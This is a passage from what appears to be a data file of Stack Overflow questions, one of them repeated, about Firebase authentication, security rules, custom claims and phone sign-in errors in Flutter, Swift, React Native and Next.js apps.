</code></pre>
"
"<p>my application have two types of users one is Service provider &amp; Service Seekers I have to manage  state of Two different types of user using steam builder in flutter</p>
<p>my application have two types of users one is Service provider &amp; Service Seekers I have to manage  state of Two different types of user using stream-builder in flutter. I create a code where I can manage only one state of user I not able to manage second type of user please help!</p>
<p><a href=""https://i.stack.imgur.com/4eXv7.png"" rel=""nofollow noreferrer"">photo of my code</a></p>
"
"<p>I'm trying to use a custom auth provider in Swift so my users can login with a username and password. However, I tried following this tutorial (<a href=""https://firebase.google.com/docs/auth/ios/custom-auth"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/ios/custom-auth</a>) and it says I need to add support for custom auth tokens. I'm not able to follow this tutorial (<a href=""https://firebase.google.com/docs/auth/admin/create-custom-tokens"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/admin/create-custom-tokens</a>). Could someone help me through the process?</p>
"
"<p>I see that there are answers for this question from 2019:
<a href=""https://stackoverflow.com/questions/52993123/firestore-security-rules-allow-user-to-create-doc-only-if-new-doc-id-is-same-as"">Allow User To Create Doc Only If New Doc ID is same as User ID</a>
and they don't work for me</p>
<p>I want to restrict the creation of a doc in the userAccounts collection only to those who are authenticated and the docId needs to match the uid of the logged in user.</p>
<p>here are three versions of rules I have tried that do not work:</p>
<pre class=""lang-js prettyprint-override""><code>    match /userAccounts/{userId} {
      allow create: if request.auth.uid == userId;
      allow create: if request.auth.uid == request.resource.id;
      allow create: if path(&quot;/databases/$(database)/documents/userAccounts/&quot; + request.auth.uid) == request.path;
    }
</code></pre>
<p>i also tried</p>
<pre class=""lang-js prettyprint-override""><code>    match /userAccounts/{document=**} {
      allow create: if request.auth.uid == userId;
      allow create: if request.auth.uid == request.resource.id;
      allow create: if path(&quot;/databases/$(database)/documents/userAccounts/&quot; + request.auth.uid) == request.path;
    }
</code></pre>
<p>I tried the rules one at a time and no combination works for my scenario.  Has the rules engine changed since 2019 so that this is not possible?</p>
<h2>EDIT 1:</h2>
<p>here is my current rules:</p>
<pre class=""lang-js prettyprint-override""><code>    match /userAccounts/{userId}/{documents=**} {
      allow read, update: if if request.auth != null &amp;&amp; request.auth.uid == resource.data.userId;
      allow create: if request.auth != null &amp;&amp; request.auth.uid == userId;
    }
</code></pre>
<p>Here is the jest unit test that is testing against the rules in a local emulator:</p>
<pre class=""lang-js prettyprint-override""><code> currentUser = testEnv.authenticatedContext('testUserId123');

  it('only current user can CREATE userAccount for current user', async () =&gt; {
    const createByUser = currentUser
      .firestore()
      .collection('userAccounts')
      .add({ userId: 'testUserId123', displayName: 'test name' });

    await assertSucceeds(createByUser);
  });
</code></pre>
<p>How can I make a rule that only allows the current user to create a doc with an id that matches the auth.uid?</p>
"
"<p>I am having some trouble integrating Google Sign-In into my Flutter app. I am using <a href=""https://pub.dev/packages/google_sign_in"" rel=""nofollow noreferrer"">google_sign_in 6.2.1</a>, and have been struggling to resolve this error for about a week now.</p>
<p>I have spent countless hours searching for help all over Google, StackOverflow, and other forums, but am completely out of answers at this point. I came across various similar issues dealing with the same error, but none of the listed solutions have worked for me.</p>
<p>Here is the error in question:
<strong>PlatformException(sign_in_failed, com.google.android.gms.common.api.ApiException: 10: , null, null)</strong></p>
<p>Here is a list of everything that I have tried thus far (to no success):</p>
<ul>
<li>Validated SHA-1 / SHA-256 keys</li>
<li>Quadruple-checked both release AND debug SHA-1/SHA-256 keys on Firebase &amp; Cloud Console</li>
<li>Verified google-services.json</li>
<li>Verified no API key restrictions on Cloud Console</li>
<li>Verified OAuth 2.0 Client IDs</li>
<li>Verified plugins in android/build.gradle</li>
<li>Verified classpaths in android/app/build.gradle</li>
<li>Verified permissions AndroidManifest.xml</li>
<li>Added a support email into Firebase / Cloud Console</li>
<li>Enabled Google Sign-In on Firebase</li>
<li>Regenerated the keys</li>
<li>Inserted SHA1 keys from the .keystore files</li>
<li>Inserted SHA1 keys from .\gradlew signingReport</li>
<li>Downloaded and updated google-services.json</li>
<li>Cleaned + Rebuilt after any and all changes made</li>
<li>Run on various build flavors (debug, profile, release)</li>
<li>Run on various devices and simulators</li>
</ul>
<p>If anyone has any suggestions on how to proceed, it would mean a lot. Thanks!</p>
"
"<p>I have two problems</p>
<ol>
<li>I tried to set specific created function earlier and was unable to make it work. I've chosen function, all saved but when trigger happens I get:</li>
</ol>
<pre><code>BLOCKING_FUNCTION_ERROR_RESPONSE : HTTP Cloud Function returned an error: 
&lt;html&gt;&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;
&lt;body text=#000000 bgcolor=#ffffff&gt;
&lt;h1&gt;Error: Forbidden&lt;/h1&gt;
&lt;h2&gt;Your client does not have permission to get URL &lt;code&gt;/func-auth&lt;/code&gt; from this server.&lt;/h2&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>Even thou I have All Traffic allowed.</p>
<p>Okay, so decided to create special function for it.
Created gen1  function via UI, picked Firebase Auth -&gt; create:</p>
<pre><code> Firebase Authentication PREVIEW
Event typecreate
</code></pre>
<p>and this function is not even visible in Firebase project to choose from</p>
<p>All over internet I found only issues about emulators, I don't use such. I'm tryibng to run this on running GCP env.</p>
"
"<h3> Not receiving OTP on Mobile But Works on Web.</h3>
I'm trying to authenticate my users mobile number as usual by firebase auth .
The Problem is I am **not able to receive otp** on emulator as well as my physical device .
But whenever i run my app on chrome using this command :
<pre><code>flutter run -d chrome 
</code></pre>
<p>I enter the same mobile number but i am receiving otp with this and not on mobile devices.
I can't figure out why its happening .
Also the otp process completes sucessfully when I'm using test phone numbers offered by firebase.</p>
<p>Following is my code for the otp verification:</p>
<pre><code>void signInWithPhone(BuildContext context, String phoneNumber) async {
try {
  await auth.verifyPhoneNumber(
      phoneNumber: phoneNumber,
      verificationCompleted: (PhoneAuthCredential credential) async {
        print('Before-signing in with credential');
        await auth.signInWithCredential(credential);
        debugPrint('After-signing in with credential');
      },
      verificationFailed: (e) {
        debugPrint(e.message.toString());
        debugPrint(&quot; THIS IS ERROR ${e.message}&quot;);
        showSnackbar(context: context, content: e.message!.trim());
        throw Exception(e.message);
      },
      codeSent: ((String verificationId, int? resendToken) async {
        debugPrint('Code sent');
        Navigator.pushNamed(context, OTPScreen.routeName,
            arguments: verificationId);
      }),
      codeAutoRetrievalTimeout: (String verificationId) {
        debugPrint('Auto retrieval timeout');
      });
} on FirebaseAuthException catch (e) {
  debugPrint(e.message!);
  debugPrint(e.toString());
  showSnackbar(context: context, content: e.message!);
}
</code></pre>
<p>}</p>
<p>And I'm calling the above function in the following ways :</p>
<pre><code>void sendPhoneNumber() {
try {
  debugPrint('VerificationCompleted');
  String phoneNumber = phoneController.text.trim();
  if (country != null &amp;&amp; phoneNumber.isNotEmpty) {
    ref
        .read(authControllerProvider)
        .signInWithPhone('+${country!.phoneCode}$phoneNumber', context);
  }
} catch (e) {
  showSnackbar(context: context, content: 'Fill the phone number field');
}
</code></pre>
<p>}</p>
<p>I get the following errors :</p>
<pre><code> Play Integrity Token fetch failed, falling back to Recaptcha-9: Integrity API error (-9): Binding to the service in the Play Store has failed. This can be due to having an old Play Store version installed on the device.
E/zzb     ( 4546): Ask the user to update Play Store.
E/zzb     ( 4546):  (https://developer.android.com/google/play/integrity/reference/com/google/android/play/core/integrity/model/IntegrityErrorCode.html#CANNOT_BIND_TO_SERVICE).
D/EGL_emulation( 4546): app_time_stats: avg=632.60ms min=33.58ms max=1231.62ms count=2
W/System  ( 4546): Ignoring header X-Firebase-Locale because its value was null.
W/LocalRequestInterceptor( 4546): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
E/OpenGLRenderer( 4546): Unable to match the desired swap behavior.
E/FirebaseAuth( 4546): [GetAuthDomainTask] Error getting project config. Failed with INVALID_CERT_HASH 400
E/zzb     ( 4546): Failed to get reCAPTCHA token with error [There was an error while trying to get your package certificate hash.]- calling backend without app verification
W/WindowOnBackDispatcher( 4546): sendCancelIfRunning: isInProgress=falsecallback=android.view.ViewRootImpl$$ExternalSyntheticLambda17@cbdc15b
D/EGL_emulation( 4546): app_time_stats: avg=1098.10ms min=1098.10ms max=1098.10ms count=1
W/System  ( 4546): Ignoring header X-Firebase-Locale because its value was null.
W/LocalRequestInterceptor( 4546): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
E/FirebaseAuth( 4546): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17093 null
D/FirebaseAuth( 4546): Invoking original failure callbacks after phone verification failure for +917387251914, error - This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.
D/CompatibilityChangeReporter( 4546): Compat change id reported: 247079863; UID 10192; state: DISABLED
I/flutter ( 4546): This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.
I/flutter ( 4546):  THIS IS ERROR This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.

</code></pre>
<p>Steps I performed till now :</p>
<ol>
<li>Configured the correct SHA keys and added it to firebase</li>
<li>Upgraded to the latest versions of dependencies.</li>
<li>Browse every possible question and answer on here as well as on google.</li>
</ol>
"
"<p>my application have two types of users one is Service provider &amp; Service Seekers I have to manage  state of Two different types of user using steam builder in flutter</p>
<p>my application have two types of users one is Service provider &amp; Service Seekers I have to manage  state of Two different types of user using stream-builder in flutter. I create a code where I can manage only one state of user I not able to manage second type of user please help!</p>
<p><a href=""https://i.stack.imgur.com/4eXv7.png"" rel=""nofollow noreferrer"">photo of my code</a></p>
"
"<p>I am trying to verify an email before being updated, with this code:</p>
<pre><code>try {
    await verifyBeforeUpdateEmail(auth.currentUser, &quot;aaa@bbb.ccc&quot;)
    //...code1
} catch (e) {
    //...code2
}
</code></pre>
<p>Even if code1 is called - as the function worked correctly - the verification email does not arrive.</p>
<p>Also, I do not know which email template is used by this function. I have four templates on firebase console:</p>
<ul>
<li><p>Verify email address</p>
</li>
<li><p>Password reset</p>
</li>
<li><p>Email address edited</p>
</li>
<li><p>Sign up notification</p>
</li>
</ul>
"
"<p>Writing an Android app that needs to access thumbnails on Firebase Storage Emulator. Images created using the Firebase Resize-Image function.</p>
<p>The link for each thumbnail is a StorageReference based on the bucket, auth and filename:</p>
<p>Example:</p>
<pre><code>var storageRef = FirebaseStorage.getInstance(&quot;gs://my-bucket/&quot;).getReference(authID + filename) 
</code></pre>
<p>These created urls are identical to the link for the thumbnails on Firebase Storage Emulator.</p>
<p>Next step is downloadUrl as follows:</p>
<pre><code>storageRef.downloadUrl.addOnCompleteListener {
  fileUri = it.result 
 
  Picasso.get().load(fileUri).resize(200,0).into(holder.binding.imageView)
}
</code></pre>
<p>Error shows when this line is called:</p>
<pre><code>fileUri = it.result
</code></pre>
<blockquote>
<p>com.google.android.gms.tasks.RuntimeExecutionException: com.google.firebase.storage.StorageException: User does not have permission to access this object.</p>
</blockquote>
<p>Bucket rules on Firebase Storage Emulator are set like this:</p>
<pre><code>rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write;
    }
  }
}
</code></pre>
<p>Bucket should be set to accept any request?</p>
<p>The tokenized, public links from the original images are retained in Realtime Database and the Android app can access those without issue. Example link:
<a href=""http://10.0.2.2:9199/v0/b/..."" rel=""nofollow noreferrer"">http://10.0.2.2:9199/v0/b/...</a>.</p>
"
"<p>I have Firebase Realtime db structure as .</p>
<pre><code>.
└── root/
    ├── abc
    ├── xyz
    └── my_target/
        └── target_id/
            ├── msg: &quot;hi&quot;
            └── userIds : [12, 23, 34]
</code></pre>
<p>now I want user to read <code>my_target</code> data if <code> my_target/userIds conains auth.uid</code></p>
<p>I tried doing this but this is not allowing user to read</p>
<pre><code>{
  &quot;rules&quot;: {
    &quot;my_target&quot;: {
      &quot;$target_id&quot;: {
       &quot;.read&quot;: &quot;auth != null &amp;&amp; root.child('my_target/' + $target_id+ '/userIds').val().contains(auth.uid)&quot;,
        &quot;.write&quot;: true 
      }
    }
  }
}
</code></pre>
<p>For eg I want this code to be allowed to read</p>
<pre><code>/my_target/target_id
</code></pre>
<p>while using uid that is present in userIds array.
I was expecting it to work, but it didnt allowed even if I put userId same as one in the userId array.</p>
"
"<p>I am new to unit testing on flutter but I want to try write some unit test to the signup process for a small application I created.</p>
<pre><code>import 'package:counter/models/user.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'dart:developer' as developer;

class AuthenticationService {
  final FirebaseAuth _firebaseAuth = FirebaseAuth.instance;

  Future&lt;UserModel?&gt; signUpUser(String email, String password) async {
    try {
      final UserCredential userCredential =
          await _firebaseAuth.createUserWithEmailAndPassword(
              email: email.trim(), password: password.trim());
      final User? firebaseUser = userCredential.user;
      if (firebaseUser != null) {
        return UserModel(
            id: firebaseUser.uid,
            email: firebaseUser.email,
            displayName: firebaseUser.displayName);
      } else {
        return null;
      }
    } on FirebaseException catch (e) {
      developer.log(e.message ?? &quot;&quot;);
      return null;
    }
  }

  Future&lt;void&gt; signOutUser() async {
    final User? firebaseUser = FirebaseAuth.instance.currentUser;
    if (firebaseUser != null) {
      await FirebaseAuth.instance.signOut();
    }
  }

  Future&lt;UserModel?&gt; signInUser(String email, String password) async{
    try{
      final UserCredential userCredential = await  _firebaseAuth.signInWithEmailAndPassword(email: email, password: password);
      final User? firebaseUser = userCredential.user;
      if(firebaseUser != null){
        return UserModel(
          id:firebaseUser.uid,
          email: firebaseUser.email,
          displayName: firebaseUser.displayName
        );
      }else{
        return null;
      }
    } on FirebaseException catch (e) {
      developer.log(e.message ?? &quot;&quot;);
      return null;
    }
  }
}


</code></pre>
<p>I tried following a few guides and videos but most of them are older and I couldn't figure out how to apply it to my code , I would like to know If and how to unit test this and if I am doing something wrong.</p>
"
"<p>I am trying to build a rbac where i have Users, Organization, Collection1, Collection2 where the users have roles like &quot;admin&quot;,&quot;expert&quot;,&quot;noob&quot;. an admin can give &quot;expert&quot; level access and an &quot;expert&quot; can give &quot;nood&quot; level access to users.
Admin can write,read Organization, Collection1</p>
<p>Expert can read all and updated some fields in Collection1 and  (Read the docs guess i need to store these fields in a separate SubCollection).
Noob can only read some fields in the assigned Doc from Collection1 and Collection2 but cannot edit anything.
By far i have accomplished this by creating SubCollection /OrganizationAccess /Collection1 /Collection2 where i create doc by uid and writing rules like
<code>// Access to OrganizationAccess collection group match /{cpath=**}/OrganizationAccess/{accessId} { allow read: if request.auth != null; }</code>
same for Collection1 and Collection2
All seems good... but what if i want to query or paginate OrganizationAccess,Collection1,Collection2
i cannot simply because that is not how firebase works i believe, This makes me question this approach. Please let me know if this needs modification or recommend a robust structure that has less data duplication and uses less get() calls in firebase rules. This question might be incomplete but i would appreciate if we all settle this once in for all.</p>
"
"<p>My team has three large Realtime Database shards, each one is several TB. We would like to add an index so that queries can be ordered by timestamp. Before adding the index this warning is displayed:</p>
<blockquote>
<p>[FirebaseDatabase] Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding &quot;.indexOn&quot;: &quot;timestamp&quot; at {path} to your security rules for better performance</p>
</blockquote>
<p>While <a href=""https://firebase.google.com/docs/database/security/indexing-data#section-indexing-order-by-value"" rel=""nofollow noreferrer"">this documentation</a> recommends adding indexes before launching, it doesn't go into detail on the impact of adding indexes to an existing database.</p>
<p>Does it incur a cost or slow down the database? Would it put additional load on the database? Or are there any other problems we could run into from adding an index for a large amount of data in Realtime Database?</p>
"
"<p>I have rest services backend. I am using google identity platform to issue the token . There are some services which could be called anonymously, so I am using anonymous login in the identity platform. This returns a token , but I want to customize the claims in the returned token. With email-password authentication , I could trigger a google cloud function which would personalize the token. With anonymous authentication, the function is not being triggered.</p>
<p>Is there a way  to personalize the claims ?</p>
"
"<p>I'm working on a project using React and Firebase.
I'm trying to assign custom claims for two different user types, buyer and seller, each with a different UI.
I have created 2 different user signup pages that will assign custom claims on the client side in javascript. I've recently learnt that assigning custom claims should be done on Cloud Functions using <code>firebase.auth().createUserWithEmailAndPassword</code> as its unsafe on the client side.</p>
<p>My question is, how would I distinguish, and appropriately assign claim, between buyer and seller in cloud functions when the function is triggered by a new user?</p>
"
"<p>I have a Firebase Function that verifies if requests are from an authorized user with Google Identity Toolkit's signInWithPassword endpoint.  The vast majority of the time this works fine. However, when requests, and therefore sign-in attempts, are received frequently (a request every 5 seconds for 10 minutes) it will start returning a 400 'ERR_BAD_REQUEST'.  Sometimes it breaks down gradually - a fail, then succeed on a retry, then fail repeatedly.  Sometimes it goes straight to failing repeatedly.  Sometimes it gets through the 10 minutes of sign-ins fine, though rarely.  These frequent sign-ins are for the same user.  The sign-in code:</p>
<pre><code>const signIn = {
    url: 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=abc123',
    data: {
        email: email,
        password: pass,
        returnSecureToken: true,
    },
    config: {
        headers: {
            'Content-Type': 'application/json',
        },
    },
};
const authRes = await axios.post(signIn.url, signIn.data, signIn.config);
</code></pre>
"
"<p>I have this db:</p>
<pre><code>db
 \
  users
   \
    $uid
     \
      email: &quot;john@email.com&quot;
     \
      username: &quot;John&quot;
</code></pre>
<p>I'm trying to not let the users to add other fields than <code>email</code> and <code>username</code>, so I have added:</p>

<pre class=""lang-json prettyprint-override""><code>{
  &quot;rules&quot;: {
    &quot;users&quot;: {
      &quot;$uid&quot;: {
        &quot;.read&quot;: &quot;$uid === auth.uid&quot;,
        &quot;.write&quot;: &quot;$uid === auth.uid&quot;,
        &quot;email&quot;: {
          &quot;.validate&quot;: &quot;newData.isString()&quot;
        },
        &quot;username&quot;: {
          &quot;.validate&quot;: &quot;newData.isString()&quot;
        },
        &quot;$other&quot;: { &quot;.validate&quot;: false } //Here!!!!!!!
      }
    }
  }
}
</code></pre>
<p>Which works correct. What I also want to do, is to not allow the users to create other nodes within the <code>users</code> node other than the UID. So I have also added the above validation:</p>
<pre class=""lang-json prettyprint-override""><code>{
  &quot;rules&quot;: {
    &quot;users&quot;: {
      &quot;$uid&quot;: {
        &quot;.read&quot;: &quot;$uid === auth.uid&quot;,
        &quot;.write&quot;: &quot;$uid === auth.uid&quot;,
        &quot;$other&quot;: { &quot;.validate&quot;: false } //Works
      },
      &quot;$other&quot;: { &quot;.validate&quot;: false } //Doesn't work
    }
  }
}
</code></pre>
<p>But this operation fails:</p>
<blockquote>
<p>I get Error saving rules - Line 9: Cannot have multiple default rules ('$uid' and '$other').</p>
</blockquote>
<p>So how to invalidate the addition of other nodes inside the <code>users</code> node, when using wild cards?</p>
"
"<p>is: <code>console.log(session?.data?.user); // {email: 'test@gmail.com'}</code>
expect:  <code>{email: 'test@gmail.com', name: &quot;test name&quot;}</code></p>
<p>Here is a code:</p>
<p>[...nextauth].ts</p>
<pre><code>export const authOptions = {
  // Configure one or more authentication providers
  pages: {
    signIn: &quot;/sign-in&quot;,
    signUp: &quot;/sign-up&quot;,
  },
  providers: [
    CredentialsProvider({
      name: &quot;Credentials&quot;,
      credentials: {},
      async authorize(credentials): Promise&lt;any&gt; {
        return await signInWithEmailAndPassword(
          auth,
          (credentials as any).email || &quot;&quot;,
          (credentials as any).password || &quot;&quot;
        ).then((userCredential) =&gt; {
          if (userCredential.user) {
            return userCredential.user;
          }
          return null;
        });
      },
    }),
  ],
};
</code></pre>
<p>I found out a callback function, but couldn't figure out how to implement.</p>
"
"<p>Having an issue with the React Native persistence of Auth. I am using Async Storage as per below. However, the auth state persist only on the 2nd time auth happens not on the first, i.e. when the user signs again after they had created an account. On the first encounter/user creation, auth does not persist.</p>
<p>It should persist on the very first time or at least that's what I want to achieve.</p>
<p>Using</p>
<ul>
<li>React Native - 0.73.4</li>
<li>Firebase SDK Version - 10.8.0</li>
<li>react-native-async-storage/async-storage - 1.21.0</li>
</ul>
<pre><code>if (getApps().length === 0) {
  app = initializeApp(config);
  auth = initializeAuth(app, {
    persistence: getReactNativePersistence(AsyncStorage),
  });
} else {
  app = getApp();
  auth = getAuth(app);
}
</code></pre>
<pre><code>useEffect(() =&gt; {
    const unsubscribe = onAuthStateChanged(auth, async (user) =&gt; {
      if (user) setUserId(user.uid);
      else setUserId(null);
      console.log(&quot;user&quot;, user);
    });

    return () =&gt; unsubscribe();
  }, []);
</code></pre>
<pre><code>import AsyncStorage from &quot;@react-native-async-storage/async-storage&quot;;
</code></pre>
<p>I tried last couple of firebase versions and importing from the firebase auth react native entry point, with no luck.</p>
"
"<p>I don't understand how Firebase security work</p>
<p>Hello there, I'm working on a React Native project using Firebase backend. I've finished it, and before uploading it to the app store, I wanted to review the security aspects, but there are a few things I don't understand.</p>
<p>1-If I store the Firebase keys in a .env file, won't they be visible to someone who downloads the application?</p>
<p>2-I'm using Cloud Functions to access the database. How can I prevent the HTTP request link from being visible and ensure that anyone can't make requests with the address?</p>
<p>3-Is it necessary to implement the authentication system from the client side? Or can I do it solely from cloud functions? I ask this because that way I wouldn't need to expose my Firebase keys in my client.</p>
<p>4- I hardly understand anything about cybersecurity and what attackers can or cannot do to my application if I publish it. If someone could send me a helpful video or post, I would appreciate it.</p>
<p>thanks.</p>
"
"<p>I'm doing blocking function call from Firebase, as described in the documentation <a href=""https://firebase.google.com/docs/auth/extend-with-blocking-functions"" rel=""nofollow noreferrer"">here</a>.</p>
<p>However, this feature seems to require an open public HTTP cloud function, which is unfortunate.</p>
<p>I would love to authorize that request came from Firebase and not some 'hacker'.</p>
<p>I've tried looking through the source code for authorization in the library, but I can't seem to find it.</p>
<p>Can someone please provide guidance on how to properly authorize sender for a blocking function call that it came from Firebase or clarify any misconceptions I might have regarding this process?</p>
"
"<p>please let me know how can we implement phone Auth on expo</p>
<p>For webapp we use</p>
<pre><code>import { getAuth, RecaptchaVerifier } from &quot;firebase/auth&quot;;

const auth = getAuth();
window.recaptchaVerifier = new RecaptchaVerifier(auth, 'sign-in-button', {
    'size': 'invisible',
    'callback': (response) =&gt; {
        reCAPTCHA solved, allow signInWithPhoneNumber.
        onSignInSubmit();
    }
});
</code></pre>
<p>But if we try using this in expo mobile app, how to get element id like sign-in-button?</p>
<p>I tried this</p>
<pre><code>import auth from &quot;@react-native-firebase/auth&quot;;

const signInWithPhoneNumber = async (user) =&gt; {
    try {
        const confirmation = await auth().signInWithPhoneNumber(&quot;+91&quot; + user);
        if (confirmation) {
            setConfirm(confirmation);
        }
    } catch (error) {
        console.log(&quot;Error sending code: &quot;, error)
    }
}
const confirmCode = async () =&gt; {
    const userCredential = await confirm.confirm(code);
    const user = userCredential.uer
    console.log(user)
}
</code></pre>
<p>I get error :</p>
<blockquote>
<p>ERROR  Error: You attempted to use a firebase module that's not installed on your Android project by calling firebase.app().<br />
Ensure you have:\</p>
<ol>
<li><p>imported the 'io.invertase.firebase.app.ReactNativeFirebaseAppPackage' module in your 'MainApplication.java' file.</p>
</li>
<li><p>Added the 'new ReactNativeFirebaseAppPackage()' line inside of the RN 'getPackages()' method list.</p>
</li>
</ol>
<p>See <a href=""http://invertase.link/android"" rel=""nofollow noreferrer"">http://invertase.link/android</a> for full setup instructions., js engine: hermes</p>
</blockquote>
"
"<p>I'm working on a project made with NextJS and I'm using firebase services. When I started working on the authentication and security of the project I began using firebase security rules and I found out that they are really limited for the things I want to do. Also, the testing interface firebase provides is really poor which leads to wasting a lot of time in testing each rule.</p>
<p>That's why I thought of not using firebase security rules. Instead of that, I'd send every request from the client to the nextjs server, then the server sends the request using firebase admin SDK. The security rules operations are set to false so that the only way to make a request is through the server, and the server is the one that validates every request.</p>
<p>This approach works but I'm wondering if it's the best one, given that firebase was designed to be used with their security rules. I want to know if firebase security rules are in fact limited or I'm just not using them correctly. And, in case they are limited, I want to know if I'm taking a good path or maybe it's just better to not use firebase at all.</p>
"
"<p>I'm trying to integrate Firebase authentication into my iOS app using Swift. I've set up the Firebase SDK and imported Firebase at the top of my Swift file, but I'm encountering an issue where the <code>Auth</code> and <code>User</code> classes from Firebase are not recognized in my code.</p>
<p>Here's the relevant part of my code:</p>
<pre class=""lang-swift prettyprint-override""><code>import Firebase

class AuthManager {
    
    static let shared = AuthManager()
    
    func loginUser(email: String, password: String, completion: @escaping (Result&lt;User, Error&gt;) -&gt; Void) {
        Auth.auth().signIn(withEmail: email, password: password) { authResult, error in
            if let user = authResult?.user {
                completion(.success(user))
            } else if let error = error {
                completion(.failure(error))
            }
        }
    }
    
    func registerUser(email: String, password: String, completion: @escaping (Result&lt;User, Error&gt;) -&gt; Void) {
        Auth.auth().createUser(withEmail: email, password: password) { authResult, error in
            if let user = authResult?.user {
                completion(.success(user))
            } else if let error = error {
                completion(.failure(error))
            }
        }
    }
    
    func signOutUser() {
        do {
            try Auth.auth().signOut()
        } catch {
            print(&quot;Error signing out: \(error.localizedDescription)&quot;)
        }
    }
}
</code></pre>
<p>However, Xcode is giving me the following errors:</p>
<ul>
<li>&quot;Cannot find 'Auth' in scope&quot;</li>
<li>&quot;Cannot find type 'User' in scope&quot;</li>
</ul>
<p>I've already checked that I've properly imported Firebase at the top of my file, and I've integrated Firebase using CocoaPods according to the documentation. Is there something I'm missing or a step I overlooked in setting up Firebase authentication in my project?</p>
<p>Any help or suggestions would be greatly appreciated. Thank you!</p>
"
"<p>I am trying to query a subset of a collection from firestore. My firestore rules for the route are</p>
<pre><code>match /data/{firstId}/subCol/{secondId}/subSubCol/{thirdId} {
    allow create: if true;
    allow read: if resource.data.authorUid == request.auth.uid;
    allow write: if resource.data.authorUid == request.auth.uid;
    allow delete: if resource.data.authorUid == request.auth.uid;
}
</code></pre>
<p>I can write to the document at this location perfectly fine. However, whenever I attempt to a frontend query like this:</p>
<pre><code>const getAllDocsFromCollection(firstId, secondId) {
    const auth = getAuth();
    const userId = auth?.currentUser?.uid
    if(!userId) {
        throw new Error(&quot;UserId undefined&quot;)
    }

    const colQuery = query(collection(db, &quot;data&quot;, firstId, &quot;subCol&quot;, secondId, &quot;subSubCol&quot;), where(&quot;authorUid&quot;, &quot;==&quot;, userId));
    const docs = await getDocs(colQuery);
    return docs;
}
</code></pre>
<p>I receive the error: <code>FirebaseError: Missing or insufficient permissions.</code></p>
<p>All of the identifying information is correct, and when I attempt to write to an individual document from the frontend it works fine. There is only an issue when I pull the collection. I know that when attempting to get all docs from a firestore collection, if a rule fails on any single doc, the entire query fails, however, in this instance, I believe am using a frontend query that should filter the collection and only pull docs the user has access to.</p>
"
"<p>I would like to force a user password reset in Flutter on the first time login only.
I have a field called &quot;ChangePassword&quot; in my firestore document field.</p>
<p>When I query this field I want to show a popup message that the user cannot use the app until the password is changed.</p>
<p>How do I do that in Flutter?</p>
<p>Here is where the login button is clicked</p>
<pre><code>CustomButton(
    onPressed: () {
      if (_formkey.currentState!.validate()) {
        Map&lt;String, dynamic&gt; map = {
          'email': email.text,
          'password': password.text,
        };
        model.login(context: context, map: map);
        // });
      } else {}                         
    },
    text: 'Login',
  ),
</code></pre>
<p>When the user enters in their credentials and clicks the &quot;Login&quot; button I navigate to this method</p>
<pre><code>Future&lt;void&gt; login({
    required BuildContext context,
    required Map&lt;String, dynamic&gt; map,
  }) async {
    EasyLoading.show();
    var response = await loginUsecase.call(map);
    response.fold((l) {
      Logger().d('Erroor');
      EasyLoading.dismiss();
    }, (r) {
      // Logger().d(r.toJson());
      // Logger().d(_credential);
      SharedPref.setString(kEMAIL, map[kEMAIL]);
      SharedPref.setString(kPASSWORD, map[kPASSWORD]);
      SharedPref.setBool(kLocalAuthSetted, true);
      EasyLoading.dismiss();

      Get.toNamed(AppRoutes.main);
    });
  }
</code></pre>
<p>What I want to do is intercept this method and query the user table called &quot;Users&quot; and check if this user based on the email entered, has the key &quot;ChangePassword&quot; set to true
If it is set to true I want to show a message that the password needs to be changed and then re-route them to the forgot password screen.</p>
"
"<p>I am building a simple project that uses the esp32 to collect sensor data and then save it to a Realtime Database on Firebase, I then retrieve the data in Android Studio to show to the user.</p>
<p>My problem is that my app's authentication works fine and logs in as expected and I can also create new users. But my ESP data is stored in the Realtime Database. How do I combine the authentication and the Realtime Database so each user has his own data?</p>
<p>I need a table something like this for each user that registered.
<strong>User</strong>
<em>-ESP32</em><br />
-Sensor1
-Data
-Data
-Sensor2
-Data
-Data
-Sensor3
-Data
-Data</p>
<p>Or do I misunderstand how this is supposed to work?</p>
"
"<p>Does firestore rules validate every time when data receive? Or only when the listener create?</p>
<p>Data structure</p>
<pre><code>- users
  - user1
    isAllowToReadMessage: true

- messages
  - message1
    content: &quot;Hello&quot;
  - message2
    content: &quot;How are you doing&quot;
</code></pre>
<p>And rules</p>
<pre><code>match /messages/{messageId} {
   allow list: get(/databases/$(database)/documents/users/$(request.auth.uid)).isAllowToReadMessage;
}
</code></pre>
<p>Let's say a user add a listener on <code>/messages</code>, But if <code>isAllowToReadMessage</code> changed to false after the listener added, Will user still receive newest message?</p>
<pre><code>_profileRepository.collection(&quot;messages&quot;)
            .doc(_firebaseAuth.currentUser!.uid)
            .snapshots()
            .listen((snapshot) {});
</code></pre>
"
"<p>This is the question previously i asked <a href=""https://stackoverflow.com/questions/56617814/questions-about-firestore-cache-and-reads-charge"">Questions about firestore cache and reads charge</a></p>
<p>Basically it says if i add same listener like below twice, I only get charge as single listener for receiving data.</p>
<pre><code>db.collection(&quot;testCollection&quot;).onSnapshot(function(doc) {}); 
db.collection(&quot;testCollection&quot;).onSnapshot(function(doc) {});
</code></pre>
<p>But if I using <code>get</code> in rules on that path</p>
<pre><code>match /testCollection/{documentId} {
   allow list: get(/databases/$(database)/documents/users/$(request.auth.uid)).data.isAllowToReadTestCollection;
}
</code></pre>
